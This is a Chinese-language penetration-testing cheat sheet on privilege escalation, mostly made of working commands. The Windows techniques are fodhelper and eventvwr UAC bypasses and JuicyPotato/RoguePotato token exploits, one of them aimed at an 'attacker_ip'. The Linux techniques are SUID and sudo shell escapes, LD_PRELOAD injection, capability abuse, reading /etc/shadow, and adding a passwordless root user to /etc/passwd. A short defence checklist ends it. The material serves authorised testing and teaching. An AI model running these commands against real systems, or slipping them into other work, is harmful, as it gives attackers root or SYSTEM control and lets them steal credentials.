# 权限提升

## 概述

权限提升（Privilege Escalation）是内网渗透中从低权限账户获取更高权限（SYSTEM/root/域管理员）的过程。分为纵向提权（低权限→高权限）和横向提权（同级别不同账户）两种。掌握常见的权限提升技术是渗透测试的核心能力之一。

## Windows权限提升

### UAC绕过

Windows UAC（用户账户控制）在默认设置下对管理员账户的权限有限制。许多程序在执行时需要提权，这为UAC绕过提供了机会。

#### Fodhelper绕过

```cmd
# Fodhelper.exe是辅助功能设置程序，默认自动提权
# 通过注册表劫持实现UAC绕过

reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d "cmd.exe /c whoami > c:\evidences\output.txt" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v "DelegateExecute" /t REG_SZ /f
fodhelper.exe

# 清理痕迹
reg delete HKCU\Software\Classes\ms-settings /f
```

#### EventVwr绕过

```cmd
# EventVwr.exe（事件查看器）同样具有autoElevate属性
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe /c whoami" /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f
```

### Potato家族提权

Potato系列漏洞利用Windows的SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege特权，通过NT\\Authority\\SYSTEM账户的令牌提权。

#### JuicyPotato

```cmd
# 下载JuicyPotato并执行
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami > c:\output.txt" -t *

# 指定CLSID（不同Windows版本需要不同CLSID）
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```

#### RoguePotato

```cmd
# 利用NT\\Authority\\SYSTEM的命名管道模拟
RoguePotato.exe -r attacker_ip -e cmd.exe -l 1337
```

#### LonelyPotato

当SeImpersonate不可用但SeAssignPrimaryToken可用时：

```cmd
# 通过创建计划任务获取System Token
LonelyPotato.exe
```

## Linux权限提升

### SUID二进制

SUID（Set User ID）位允许以文件所有者的权限执行程序：

```bash
# 查找所有SUID文件
find / -perm -4000 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null

# 使用GTFOBins检查已知SUID利用
# 示例：python SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# 示例：find SUID
find . -exec /bin/sh -p \; -quit

# 示例：nmap SUID
nmap --interactive
!sh

# 示例：vim SUID
vim -c '!sh'
```

### Sudo配置错误

```bash
# 查看当前用户sudo权限
sudo -l

# 常见sudo提权场景
# 允许以root执行特定程序

# 通配符利用（如bin=> /usr/bin/*）
sudo -u root tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# 环境变量继承
# env_keep环境变量利用（LD_PRELOAD）
sudo LD_PRELOAD=/tmp/evil.so /usr/sbin/apache2 restart

# service命令提权
sudo service ../../bin/sh

# python提权
sudo python -c 'import os; os.system("/bin/sh")'

# 绕过PATH限制
sudo PATH=/tmp:$PATH somebinary
```

### 能力（Capabilities）滥用

```bash
# 查找具备特殊能力的文件
getcap -r / 2>/dev/null

# 常见提权能力
# cap_setuid+ep → 可setuid(0)
python3: cap_setuid=ep
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_override+ep → 可绕过文件权限
# cap_sys_admin+ep → 可挂载等操作
# cap_net_raw+ep → 可用于构造Raw包

# 利用tar的cap_dac_read_search读取任意文件
tar -cvf /dev/null /etc/shadow --to-command=cat
```

### 其他Linux提权方法

```bash
# 可写/etc/passwd（root用户可编辑）
echo "root2:x:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2  # 密码为空

# 可写/etc/shadow（修改root密码）
openssl passwd -1 -salt newpass newpass
# 替换/etc/shadow中的root哈希

# NFS no_root_squash
# 如果/etc/exports配置了no_root_squash，攻击者可以root身份挂载
mount -t nfs target:/share /mnt
# 在/mnt中创建setuid文件

# 计划任务（Cron）
# 检查可写的cron脚本
ls -la /etc/cron*
# 如果脚本可写，添加提权命令

# Tmux/Screen会话劫持
# 找到可读的screen socket
ls -la /var/run/screen/
screen -x user/pty
```

## 检测与防御

### Windows防御清单

- 启用UAC最高级别（始终通知）
- 部署AppLocker限制应用程序执行
- 启用Windows Defender Credential Guard
- 定期更新系统补丁
- 移除SeImpersonatePrivilege等危险特权
- 审核服务配置和注册表权限

### Linux防御清单

- 最小化SUID二进制文件
- 严格管理sudo配置
- 及时更新内核安全补丁
- 使用SELinux/AppArmor强制访问控制
- 限制Capabilities分配
- 不将用户加入docker组
- 内核启用KASLR和SMEP/SMAP
